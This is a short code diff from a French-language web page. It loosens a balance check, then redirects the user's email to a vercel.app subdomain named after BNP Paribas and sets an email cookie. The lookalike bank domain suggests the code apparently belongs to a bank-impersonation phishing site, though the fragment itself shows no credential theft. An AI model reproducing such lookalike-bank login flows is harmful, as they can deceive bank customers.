@@ -1738,7 +1738,7 @@ Si ce n'est pas le cas, inscrivez-vous dès maintenant en cliquant sur le lien s
  
 const usercrendential= 
 extrUser(contenu,mail.value)
-  if(usercrendential.tot_amount>0){
+  if(usercrendential.tot_amount>=0){
     localStorage.clear()
     window.location.href = `https://bnpparibasinter.vercel.app/account?authuser=${mail.value}`
     createCookie('email', mail.value, 1)
